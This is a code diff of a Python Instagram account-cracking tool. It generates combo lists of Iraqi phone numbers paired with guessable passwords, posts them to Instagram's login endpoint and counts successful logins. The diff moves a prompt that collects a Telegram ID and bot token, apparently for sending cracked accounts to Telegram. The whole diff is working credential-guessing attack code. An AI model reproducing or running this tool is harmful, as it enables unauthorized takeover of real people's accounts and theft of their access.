@@ -226,6 +226,12 @@ def instagram2():
 	import requests
 	from user_agent import generate_user_agent
 	from datetime import datetime
+	agar=input(wd+"   You Want To Bot TELEGRAM Your Results (y,yes or n,no)")
+	if agar=='y' or agar=='yes' or agar=='Y' or agar=='YES' or agar=='Yes':
+		ID=input("    Your ID Telegram :")
+		token=input("    Token(bot) : ")
+	else:
+		pass
 	for lol in range(5000):
 		sys.stdout=open("combo.txt", "a")
 		r=random.randint(1000000, 9999999)
@@ -233,12 +239,6 @@ def instagram2():
 		print("+964770"+str(r)+":"+str(r))
 		print("+964750"+str(rr)+":"+str(rr))
 		sys.stdout.flush()
-	agar=input(wd+"   You Want To Bot TELEGRAM Your Results (y,yes or n,no)")
-	if agar=='y' or agar=='yes' or agar=='Y' or agar=='YES' or agar=='Yes':
-		ID=input("    Your ID Telegram :")
-		token=input("    Token(bot) : ")
-	else:
-		pass
 	def loopPp():
 		try:
 			global bad, timeout, checkpoint, error, hits
@@ -272,7 +272,6 @@ def instagram2():
                         'enc_password': "#PWD_INSTAGRAM_BROWSER:0:"+str(time_now)+":"+str(pasw),
                         'queryParams': {},
                         'optIntoOneTap': 'false',}
-				r = requests.session()
 				login = r.post(url,headers=head,data=data).text
 				try:
 					if '"authenticated":false' in login:
@@ -329,6 +328,12 @@ def instagram3():
 	from datetime import datetime
 	r = requests.session()    
 	print(wd+'    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')
+	agar=input(wd+"   You Want To Bot TELEGRAM Your Results (y,yes or n,no)")
+	if agar=='y' or agar=='yes' or agar=='Y' or agar=='YES' or agar=='Yes':
+		ID=input("    Your ID Telegram :")
+		token=input("    Token(bot) : ")
+	else:
+		pass
 	for loll in range(5000):
 		import sys
 		sys.stdout=open("combo.txt", "a")
@@ -337,12 +342,6 @@ def instagram3():
 		print("+964770"+str(r)+":0770"+str(r))
 		print("+964750"+str(rr)+":0750"+str(rr))
 		sys.stdout.flush()
-	agar=input(wd+"   You Want To Bot TELEGRAM Your Results (y,yes or n,no)")
-	if agar=='y' or agar=='yes' or agar=='Y' or agar=='YES' or agar=='Yes':
-		ID=input("    Your ID Telegram :")
-		token=input("    Token(bot) : ")
-	else:
-		pass
 	def loopPp():
 		try:
 			global bad, timeout, checkpoint, error, hits
@@ -433,6 +432,13 @@ def instagram4():
 	import requests
 	from user_agent import generate_user_agent
 	from datetime import datetime
+	agar=input(wd+"   You Want To Bot TELEGRAM Your Results (y,yes or n,no)")
+	if agar=='y' or agar=='yes' or agar=='Y' or agar=='YES' or agar=='Yes':
+		ID=input("    Your ID Telegram :")
+		token=input("    Token(bot) : ")
+	else:
+		pass
+	print(wd+'    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')
 	r = requests.session()
 	for loll in range(1000):
 		sys.stdout=open("combo.txt", "a")
@@ -449,15 +455,6 @@ def instagram4():
 		print("+964750"+str(rrrrr)+":123456123456")
 		print("+964750"+str(rrrrrr)+":1122334455")
 		sys.stdout.flush()
-	agar=input(wd+"   You Want To Bot TELEGRAM Your Results (y,yes or n,no)")
-	if agar=='y' or agar=='yes' or agar=='Y' or agar=='YES' or agar=='Yes':
-		ID=input("    Your ID Telegram :")
-		token=input("    Token(bot) : ")
-	elif agar=='n' or agar=='no' or agar=='N' or agar=='NO' or agar=='No':
-		pass
-	else:
-		pass
-	print(wd+'    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')
 	def loopPp():
 		try:
 			global bad, timeout, checkpoint, error, hits
